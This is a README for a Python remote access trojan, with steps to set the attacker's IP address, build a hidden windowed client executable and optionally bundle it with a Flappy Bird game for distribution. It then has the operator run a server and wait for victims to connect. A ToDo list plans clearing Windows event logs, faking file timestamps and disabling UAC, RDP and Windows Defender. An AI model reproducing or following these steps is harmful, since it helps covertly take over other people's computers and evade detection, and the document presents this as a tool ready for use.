# Requirements
**You NEED a 32bit OS architecture to build the binaries. So use a win 32 or unix 32 system to run and build the code**
1. python 2.x
2. opencv
3. numpy
4. pyhook
5. pythoncom
6. pyinstaller
7. pygame
8. py2exe

# Usage
1. Clone the repo
```
git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
```

2. Install opencv and numpy from requirements.txt
```
python -m pip install -r requirements.txt
```
3. install pyHook download link
http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/

4. Install pythoncom download link
http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/

5. Set ip_address and port in client.pyw and server.py. The ip_address should be the attacker's IP address.

6. Use pyinstaller to build the client binary
```
python pyinstaller.py --onefile --windowed client.pyw
```
**Skip the next 2 steps if you dont want to use the flappy bird game**

7. Setup a local server to host the client.exe. Use live-server: https://github.com/tapio/live-server

8. Use py2exe to build the flappy bird game
```
python setup.py
```
The exe for the flappy bird game will be in a folder called 'dist'

9. Run the server
```
python server.py
```

10. Wait for the client to connect

# ToDo

1. Clear the System, Security, and Application logs
2. Encrypt communication between server and client
3. Edit the accessed, created, and modified properties of files
4. Enable/Disable services such as RDP,UAC, and Windows Defender
